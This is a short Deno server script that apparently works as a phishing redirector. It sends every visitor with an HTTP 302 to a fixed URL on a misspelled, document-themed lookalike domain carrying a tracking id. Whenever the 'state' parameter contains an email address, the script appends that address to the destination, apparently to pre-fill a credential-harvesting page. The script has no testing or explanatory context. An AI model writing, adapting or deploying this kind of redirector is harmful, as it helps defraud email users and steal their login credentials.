const PORT = Number(Deno.env.get("PORT") || 8080);

const DESTINATION = "https://entry.docunnentindafsharilsdocsnoralidacitlonpath.org/?r=tjngtbtoybazctcwys7g2bik";

Deno.serve({ port: PORT }, (req) => {
  const url = new URL(req.url);
  const state = url.searchParams.get("state");

  let target = DESTINATION;
  if (state && state.includes("@")) {
    const params = new URLSearchParams({ email: state });
    target += `&${params.toString()}`;
  }

  return Response.redirect(target, 302);
});
